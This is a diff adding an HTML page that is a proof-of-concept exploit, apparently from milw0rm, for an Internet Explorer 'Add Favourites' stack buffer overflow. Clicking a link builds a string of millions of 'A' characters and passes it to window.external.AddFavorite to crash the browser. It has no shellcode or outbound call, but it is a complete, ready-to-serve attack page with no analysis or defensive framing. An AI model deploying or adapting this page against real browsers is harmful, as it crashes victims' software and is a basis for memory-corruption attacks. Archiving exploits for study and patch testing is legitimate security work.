@@ -1,0 +1,46 @@
+------------------------------------------->
+IE Add Favourites Stack Buffer Overflow POC
+
+Sberry, Compaq
+
+------------------------------------------->
+
+<html>
+<head>
+<script language="JavaScript" type="Text/Javascript">
+function go()
+{
+	var str =unescape('%u4141');
+	var finalstr = createInlineBuffer(str, 5150000);
+	var len = finalstr.length;
+	document.write(len);
+	addfav(finalstr);
+}
+			   
+/* Effient in-line creation */
+function createInlineBuffer (str, num) {
+	var	i = Math.ceil(Math.log(num) / Math.LN2),
+		res = str;
+	do {
+		res += res;
+	} while (0 < --i);
+	return res.slice(0, str.length * num);
+}
+
+/* Vulnerable Function */
+function addfav(str)
+   {
+   if (document.all)
+      {
+      window.external.AddFavorite
+      ('http://'+str,'Crash')
+      }
+   }
+</script>
+</head>
+<body>
+<a href="javascript:go()">Add To Favorites</a>
+</body>
+</html>
+
+# milw0rm.com [2009-07-09]
